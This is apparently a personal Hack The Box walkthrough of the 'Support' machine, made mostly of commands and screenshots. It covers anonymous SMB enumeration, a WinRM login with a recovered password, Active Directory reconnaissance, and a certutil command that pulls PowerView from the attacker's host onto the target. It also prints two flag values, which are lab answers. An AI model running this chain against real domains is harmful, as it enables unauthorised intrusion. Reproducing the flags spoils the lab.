### 17-Jan-24-Wed

https://app.hackthebox.com/machines/Support

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/11ffa5eb-fedd-43ed-ae02-d35bba5b4856)

```
smbclient -L 10.129.227.255 -U anonymous
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d0675d40-748b-4820-8cc0-4c5d8e607df5)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d46d0766-c8e7-4943-bae7-58085a618800)

```
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/aa24a18a-f8fe-49d0-aac4-bbfcc6af818f)


```
7c8aba654859b497501fb3d6dbb90a45
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/df56a685-5ebf-434b-ad05-8a2be876bfaa)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2b5a389b-bbac-4c10-81d5-d8127e7993c0)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bcdc9a10-e0c9-4163-8438-06ca29380565)

```
88ff8a8770107e21ac0cb5fe1a04803e
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/54bea238-4b0c-43f9-9289-2847c8767160)

```
Get-ADDomain
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/304c4ced-7ba5-4b85-b79f-6e9a3204b4bd)

```
AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=support,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
DistinguishedName                  : DC=support,DC=htb
DNSRoot                            : support.htb
DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
Forest                             : support.htb
InfrastructureMaster               : dc.support.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
ManagedBy                          :
Name                               : support
NetBIOSName                        : SUPPORT
ObjectClass                        : domainDNS
ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
ParentDomain                       :
PDCEmulator                        : dc.support.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.support.htb}
RIDMaster                          : dc.support.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
SystemsContainer                   : CN=System,DC=support,DC=htb
UsersContainer                     : CN=Users,DC=support,DC=htb
```

```
whoami /groups
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/09818fca-382d-4c9f-95b9-dfa43b6d80d9)

```
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/df99dc88-6e84-4a21-bbde-7e05966a4b06)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c80d4042-2c81-4de1-9b74-9ccfd397b7bd)

```
certutil -urlcache -f http://10.10.16.23/PowerView.ps1 PowerView.ps1
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f29a6990-d0cf-4e95-af2f-8c5ec968639f)

```
./PowerView.ps1
```

```
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

